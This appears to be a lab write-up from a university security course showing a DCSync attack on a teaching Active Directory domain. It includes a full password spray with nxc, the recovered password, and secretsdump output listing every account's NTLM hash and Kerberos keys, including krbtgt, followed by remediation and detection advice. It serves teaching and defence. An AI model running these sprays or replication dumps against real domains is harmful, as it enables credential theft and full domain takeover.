# DCSync: backup.operator Domain Replication Abuse

## Summary

`backup.operator` has been granted `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` directly on the domain naming context (confirmed in `r-21`), rights normally reserved for Domain Controllers, Domain Admins, and Enterprise Admins. Using `backup.operator`'s own credential, this activity performs a full directory replication (DCSync) against `uow-csf-dc`, recovering NTLM hashes and Kerberos keys for every domain account, including `krbtgt`, full domain compromise, without `backup.operator` holding any broader administrative access of its own.

## Environment

| Item | Value |
|---|---|
| Target | `uow-csf-dc.uow-csf.internal`, `192.168.144.200` |
| Domain | `uow-csf.internal` |
| Target account | `backup.operator` (Backup Operator) |
| Attacker | Kali VM on the same host-only lab network |
| Tools | `nxc` (netexec), `impacket-secretsdump` |
| Wordlists | `/usr/share/wordlists/cav-csf-wordlist.txt` (credential recovery, see Lab Dependencies) |

## Lab Dependencies

- Prerequisite: `r-21` (DCSync replication rights enumeration), which confirmed `backup.operator` holds both required extended rights.
- Starting access: a valid `backup.operator` credential, confirmed via the routine credential-discovery step below against the project's standard wordlist, the same technique already demonstrated against `analyst` in `r-19`.
- Resulting access: full domain credential material for every account in the domain, via DCSync.
- Feeds into: nothing further. This is the Windows Phase 2 capstone; full domain compromise leaves no further privilege to escalate to.
- Suggested teaching level: Level 7.

## Misconfiguration

Directory replication rights (`DS-Replication-Get-Changes`, `DS-Replication-Get-Changes-All`) allow a principal to request a full or partial copy of AD's replicated data, including password hashes and Kerberos keys, via the MS-DRSR protocol, the same mechanism a genuine Domain Controller uses to replicate with its peers. By default these rights are held only by Domain Controllers themselves and by Domain Admins/Enterprise Admins. Granting them to `backup.operator`, an ordinary user account with no domain-admin-equivalent group membership, gives it a path to the same outcome (recovery of every account's credential material, including `krbtgt`) without ever needing local administrative access to the domain controller itself.

## Credential Discovery

`backup.operator`'s Phase 2 credential is confirmed the same routine way any other Phase 2 account's password is validated in this project, a spray against the project's standard teaching wordlist. This is not a separate vulnerability: `backup.operator` already carries a deliberately assigned Phase 2 credential drawn from the standard wordlist, this step only confirms it before use.

```bash
nxc smb 192.168.144.200 -d uow-csf.internal -u backup.operator -p /usr/share/wordlists/cav-csf-wordlist.txt --continue-on-success
```

```text
SMB         192.168.144.200 445    UOW-CSF-DC       [*] Windows 10 / Server 2019 Build 17763 x64 (name:UOW-CSF-DC) (domain:uow-csf.internal) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:cavcsf STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:Cavcsf STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:cavcsf1 STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:Cavcsf123 STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:cavcsf2026 STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:Cavcsf2026! STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:cav-csf STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:Cav-csf STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:cav-csf1 STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:Cav-csf123 STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:cav-csf2026 STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:Cav-csf2026! STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:cavlab STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:Cavlab STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:cavlab1 STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:Cavlab123 STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:cavlab2026 STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:Cavlab2026! STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:CavLab2026! STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:uowcsf STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:Uowcsf STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:uowcsf1 STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:Uowcsf123 STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:uowcsf2026 STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:Uowcsf2026! STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:uow STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:Uow STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:uow1 STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:Uow123 STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:uow2026 STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:Uow2026! STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:westminster STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:Westminster STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:westminster1 STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:Westminster123 STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:westminster2026 STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:Westminster2026! STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:universityofwestminster STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:Universityofwestminster STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:universityofwestminster1 STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:Universityofwestminster123 STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:universityofwestminster2026 STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:Universityofwestminster2026! STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:cwscenario STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:Cwscenario STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:cwscenario1 STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:Cwscenario123 STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:cwscenario2026 STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:Cwscenario2026! STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:web STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:Web STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:web1 STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:Web123 STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:web2026 STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:Web2026! STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:webservice STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:Webservice STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:webservice1 STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:Webservice123 STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:webservice2026 STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:Webservice2026! STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:svcweb STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:Svcweb STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:svcweb1 STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:Svcweb123 STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:svcweb2026 STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:Svcweb2026! STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:backup STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:Backup STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:backup1 STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:Backup123 STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [-] uow-csf.internal\backup.operator:backup2026 STATUS_LOGON_FAILURE
SMB         192.168.144.200 445    UOW-CSF-DC       [+] uow-csf.internal\backup.operator:Backup2026!
```

Confirmed: `backup.operator:Backup2026!`.

## Exploitation

With `backup.operator`'s credential confirmed above, the DCSync request itself:

```bash
impacket-secretsdump uow-csf.internal/backup.operator@192.168.144.200
```

```text
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
Password:
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c130037cb4f111a8ce2ae7e06d786099:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:81ceebca277815671b6f283647baf0f8:::
uow-csf.internal\analyst:1103:aad3b435b51404eeaad3b435b51404ee:012af1b61a3040d9a089f5afc933d802:::
uow-csf.internal\mpatel:1104:aad3b435b51404eeaad3b435b51404ee:012af1b61a3040d9a089f5afc933d802:::
uow-csf.internal\jreed:1105:aad3b435b51404eeaad3b435b51404ee:012af1b61a3040d9a089f5afc933d802:::
uow-csf.internal\skhan:1106:aad3b435b51404eeaad3b435b51404ee:012af1b61a3040d9a089f5afc933d802:::
uow-csf.internal\helpdesk01:1107:aad3b435b51404eeaad3b435b51404ee:fe8186330c90c061f219e8d24f5e378d:::
uow-csf.internal\svc-web:1108:aad3b435b51404eeaad3b435b51404ee:1a3dec1187661e09949aed2f99e0d049:::
uow-csf.internal\backup.operator:1109:aad3b435b51404eeaad3b435b51404ee:da7a868ae3207455a709066b8fdab1f6:::
uow-csf.internal\svc-linux-auth:1115:aad3b435b51404eeaad3b435b51404ee:012af1b61a3040d9a089f5afc933d802:::
UOW-CSF-DC$:1000:aad3b435b51404eeaad3b435b51404ee:314cce14dc2f1c4bdcf7ccd254444dc3:::
CAV-CSF-LINUX$:1116:aad3b435b51404eeaad3b435b51404ee:2c59bf8aab91c1cafb772bf10a63faef:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:0b8eb5968f2607539705a0fd2d77d432e7f92c24cf976e32b742af50cc0f2f47
Administrator:aes128-cts-hmac-sha1-96:d62af7d6105ae1cab6ccbaab6a048fb0
Administrator:des-cbc-md5:79f1a23b64080b40
krbtgt:aes256-cts-hmac-sha1-96:8cbb60defdc3674adc7db788e30736883f5ca83aca72fbf189f7570cd1f2f551
krbtgt:aes128-cts-hmac-sha1-96:1f74a7fe1ab382e4442fc23105af5862
krbtgt:des-cbc-md5:7615580449190bd9
uow-csf.internal\analyst:aes256-cts-hmac-sha1-96:de45e402cf0d58ddb1540f6e6ae7ccb32daf8d30192259e8e5a29f21bfdb16d6
uow-csf.internal\analyst:aes128-cts-hmac-sha1-96:34eeb91cf56be4f08619f57a2a46de8c
uow-csf.internal\analyst:des-cbc-md5:d5ae1646454cd3ea
uow-csf.internal\mpatel:aes256-cts-hmac-sha1-96:67181a99246e44a5decb0bf10e9db57d1e0947ffa057102cafb2591154e98298
uow-csf.internal\mpatel:aes128-cts-hmac-sha1-96:abc4995d2ecdcaf19a73e35afaf33bd9
uow-csf.internal\mpatel:des-cbc-md5:f88989f70ed5a40d
uow-csf.internal\jreed:aes256-cts-hmac-sha1-96:693434fa6addfa8ecbb9a1e55e034def7122eb996041882a0fd206975ce298ef
uow-csf.internal\jreed:aes128-cts-hmac-sha1-96:84503754859eb1c2f3857625e00596b0
uow-csf.internal\jreed:des-cbc-md5:37343bbad673d5e6
uow-csf.internal\skhan:aes256-cts-hmac-sha1-96:272ec8086760df609f23a6bf9fcd8ab13acfb2ce933e02b725c03fa9c00ef2e0
uow-csf.internal\skhan:aes128-cts-hmac-sha1-96:271c79d89695dbb0edd6397c3e873275
uow-csf.internal\skhan:des-cbc-md5:0d5ecdcde023ecf1
uow-csf.internal\helpdesk01:aes256-cts-hmac-sha1-96:5f38817e3b4576da69acbb8d8eb04df4ad43f9efbad4ebd644eeaa41923bdc12
uow-csf.internal\helpdesk01:aes128-cts-hmac-sha1-96:98efe41488e480e0fd8c26618c54b008
uow-csf.internal\helpdesk01:des-cbc-md5:86d0944586706231
uow-csf.internal\svc-web:aes256-cts-hmac-sha1-96:5096a75ac12c9b8fb506ecb068ca80453bf300760f9745755c21721930466325
uow-csf.internal\svc-web:aes128-cts-hmac-sha1-96:35443a92b0dceaa5eec949261bb093f9
uow-csf.internal\svc-web:des-cbc-md5:31c867d98f9d5e54
uow-csf.internal\backup.operator:aes256-cts-hmac-sha1-96:2d0e6d0b8f1dbb61dda6687939062818a5a249294b038b75a8d06617976ec96c
uow-csf.internal\backup.operator:aes128-cts-hmac-sha1-96:a83a8e690b5e68212a94a06c86465906
uow-csf.internal\backup.operator:des-cbc-md5:ef371c26910746c2
uow-csf.internal\svc-linux-auth:aes256-cts-hmac-sha1-96:c6835e8e642ca1f8a1ad0a491f3ff4830423b418d2af6fefb1775230a88b46e5
uow-csf.internal\svc-linux-auth:aes128-cts-hmac-sha1-96:b6e5ce12294a878ccc9f0af903c4b767
uow-csf.internal\svc-linux-auth:des-cbc-md5:bf341f2ccd4380a1
UOW-CSF-DC$:aes256-cts-hmac-sha1-96:406daa612b8073a7b7ad247997d0304cbd4a08d6c83c4eda20f22d69f81a0931
UOW-CSF-DC$:aes128-cts-hmac-sha1-96:2396ed57bd47674c11b5417cba83de73
UOW-CSF-DC$:des-cbc-md5:b0c267a8798ada54
CAV-CSF-LINUX$:aes256-cts-hmac-sha1-96:4f0bb288c6277c7cfd371ca67bec1ec413798084b093043069274c88444e505c
CAV-CSF-LINUX$:aes128-cts-hmac-sha1-96:7f60ec4470d4c3a97e3b62f5c562a35a
CAV-CSF-LINUX$:des-cbc-md5:26b0a207160d106e
[*] Cleaning up...
```

The `RemoteOperations failed ... rpc_s_access_denied` line is significant: `secretsdump` first attempts a local-admin-equivalent remote registry/service-based dump, which is correctly refused since `backup.operator` has no such access, before falling back to `[*] Using the DRSUAPI method`, the actual DCSync path. The compromise demonstrated here comes specifically from the granted replication rights, not from any broader administrative foothold.

## Evidence

Full NTLM hash and Kerberos key material recovered for every domain account, including `Administrator`, `krbtgt`, and the domain user accounts shown above, comprising the Lab-Students accounts, the Phase 2 accounts, the service account, and both domain-joined computer accounts (`UOW-CSF-DC$`, `CAV-CSF-LINUX$`). `analyst`, `mpatel`, `jreed`, `skhan`, and `svc-linux-auth` share an identical NTLM hash, consistent with the unrevised Phase 1 shared baseline password; `helpdesk01`, `svc-web`, and `backup.operator` each carry distinct hashes, consistent with their individually assigned Phase 2 credentials.

`CAV-CSF-LINUX$`'s machine account material is recovered here too. This is expected blast radius, not a separate finding: because the Linux VM is intentionally domain-joined, a successful DCSync against the Windows domain necessarily exposes the Linux computer account's credential material along with everything else in the directory. This is a teaching observation about the scope of a DCSync compromise, not a fix item.

## Outcome

`backup.operator`'s over-granted replication rights alone, with no other administrative access, are sufficient for full domain compromise: every account's NTLM hash and Kerberos keys, including `krbtgt`, which enables forging tickets for any principal in the domain. This is the Windows Phase 2 capstone; there is no further privilege to escalate to from here.

## Remediation

- Remove the `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` ACEs from `backup.operator` on the domain object; these rights should be held only by Domain Controllers, Domain Admins, Enterprise Admins, and any dedicated, narrowly-scoped directory-synchronisation service account.
- Periodically audit the domain object's ACL for unexpected extended-rights grants (`dsacls`, `Get-Acl` on the `AD:\` drive, or BloodHound-style ACL-aware collection), rather than relying on group membership review alone, since this class of misconfiguration requires no group placement at all.
- Monitor for DRSUAPI replication requests originating from a source other than a genuine Domain Controller, a standard DCSync detection signal.

## Teaching Notes

- The `RemoteOperations`-denied / DRSUAPI-succeeded contrast in the tool's own output is worth drawing out explicitly: it demonstrates the compromise is attributable to the ACL misconfiguration alone, not to any broader access `backup.operator` might otherwise be assumed to have.
- Unlike group-membership misconfigurations, this vulnerability exists purely as an ACE on an object's security descriptor, with no corresponding group membership to notice by simpler means, reinforcing `r-21`'s point about needing ACL-aware reconnaissance tooling.
- The Linux machine account exposure (`CAV-CSF-LINUX$`) is a useful illustration that a Windows-side AD misconfiguration's blast radius is not confined to Windows; once another platform is domain-joined, its credential material is in scope too.
- As the Phase 2 capstone, this activity is deliberately built to require no further chaining: full domain compromise is the terminal outcome, matching `e-12`'s role as the Linux side's Level 7 capstone.
